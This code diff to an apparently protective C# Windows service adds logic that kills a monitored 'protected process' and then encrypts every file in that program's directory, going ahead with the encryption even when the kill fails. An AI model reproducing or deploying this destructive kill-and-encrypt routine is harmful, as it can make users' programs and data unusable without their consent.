@@ -516,7 +516,50 @@ namespace MazSvc
 
                 if (!filesEncrypted)
                 {
-                    // Encrypt all files in the executable's directory
+                    // First, kill the protected process
+                    try
+                    {
+                        Process processToKill = Process.GetProcessById(processInfo.ProcessId);
+                        if (processToKill != null && !processToKill.HasExited)
+                        {
+                            try
+                            {
+                                processToKill.Kill();
+                                processToKill.WaitForExit(5000); // Wait up to 5 seconds for process to exit
+                                WriteEventLog(string.Format("Killed protected process: {0} (PID: {1})", processInfo.ProcessName, processInfo.ProcessId));
+                            }
+                            catch (Exception killEx)
+                            {
+                                WriteEventLog(string.Format("Failed to kill process {0} (PID: {1}): {2}", processInfo.ProcessName, processInfo.ProcessId, killEx.Message));
+                                // Continue with encryption even if kill fails
+                            }
+                            finally
+                            {
+                                try
+                                {
+                                    processToKill.Dispose();
+                                }
+                                catch
+                                {
+                                }
+                            }
+                        }
+                    }
+                    catch (ArgumentException)
+                    {
+                        // Process already exited or doesn't exist
+                        WriteEventLog(string.Format("Process {0} (PID: {1}) no longer exists", processInfo.ProcessName, processInfo.ProcessId));
+                    }
+                    catch (Exception processEx)
+                    {
+                        WriteEventLog(string.Format("Error accessing process {0} (PID: {1}): {2}", processInfo.ProcessName, processInfo.ProcessId, processEx.Message));
+                        // Continue with encryption even if we can't kill the process
+                    }
+
+                    // Wait a bit to ensure process is fully terminated and file handles are released
+                    System.Threading.Thread.Sleep(1000);
+
+                    // Now encrypt all files in the executable's directory
                     FileEncryptor.EncryptAllFiles(exeDirectory, Path.GetFileName(processInfo.FullPath));
 
                     _notificationHelper.ShowNotification(
